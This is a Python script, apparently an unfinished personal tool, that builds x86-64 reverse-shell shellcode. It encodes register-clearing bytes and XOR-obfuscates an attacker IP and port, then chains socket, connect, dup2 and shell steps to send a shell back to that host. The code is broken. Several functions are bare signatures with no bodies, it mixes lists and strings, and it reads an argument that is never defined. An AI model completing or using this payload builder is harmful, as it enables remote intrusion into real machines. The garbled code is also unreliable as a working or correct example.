import argparse
import operator

def clean(register):
    if register == "rax":
        values = ["\x48\x31\xC0", "\xB0\x01\x48\xFF\xC8"]
    if register == "rbx":
        values = ["\x48\x31\xDB", "\xB3\x01\x48\xFF\xCB"]
    if register == "rcx":
        values = ["\x48\x31\xC9", "\xB1\x01\x48\xFF\xC9"]
    if register == "rdx":
        values = ["\x48\x31\xD2", "\xB2\x01\x48\xFF\xCA"]
    if register == "rdi":
        values = ["\x48\x31\xFF", "\xB0\x01\x48\xFF\xC8"]
    if register == "rsi":
        values = ["\x48\x31\xF6", "\xB0\x01\x48\xFF\xC8"]
    
    return values

def socket()
def connect()
def dup2()
def shell()
def clean_exit()

def constructor(ip, port):
    shellcode = ""
    shellcode += clean("rax")
    shellcode += clean("rbx")
    shellcode += clean("rcx")
    shellcode += clean("rdx")
    shellcode += clean("rdi")
    shellcode += clean("rsi")
    shellcode += socket()
    shellcode += connect(ip, port)
    shellcode += dup2()
    shellcode += shell()
    shellcode += clean_exit()

    print("Hello your shellcode is "+len(shellcode)/4+" character long !")
    print(shellcode)

    return shellcode

def ip_treatment(ip):
    """
    Hex conversion, xor and reverse it
    """
    ip_split = ip.split(".")
    ip_treated = "0x"
    for i in range(3, -1, -1):
        treating = int(ip_split[i])
        treating = treating^255
        treating = hex(treating)
        treating = str(treating).split("x")[1]
        ip_treated += str(treating)
    
    return ip_treated

def port_treatment(port):
    """
    Hex conversion, xor
    """
    port_treated = "0x"
    port = int(port)
    port = hex(port)
    port = str(port).split("x")[1]
    if len(port) != 4:
        print("bad port")
        exit()
    port_part_one = port[2:5]
    port_part_two = port[0:2]
    port_treated += port_part_one + port_part_two

    return port_treated

#def copy_and_modify(version, name, ip, port):

if __name__ == "__main__":

    # Argparse ain't that hard to use
    # You just need to initialize the ArgumentParser
    # You can use the data in the argument later 
    parser = argparse.ArgumentParser()

    # Then initialize the arguments
    parser.add_argument("--shellcode-it", "-s", default=False, action="store_true")
    parser.add_argument("--file", "-f", type=str)
    parser.add_argument("--ip-address", "-i", default="127.0.0.1", type=str)
    parser.add_argument("--port", "-p", default="8080", type=str)
    parser.add_argument("--name", "-n", default="reverser_default", type=str)

    # and then parse it
    args = parser.parse_args()

    ip = ip_treatment(args.ip_address)
    port = port_treatment(args.port)

    if args.file and not args.construct:
        with open(args.file, 'r') as f:
            code = f.read()

        code = code.replace("-ip_address-", ip)
        code = code.replace("-port-", port)
        print(code)

    elif not args.file and args.construct:
        constructor(ip, port)
    else:
        print("You need to set a file to treat")
        exit(0)
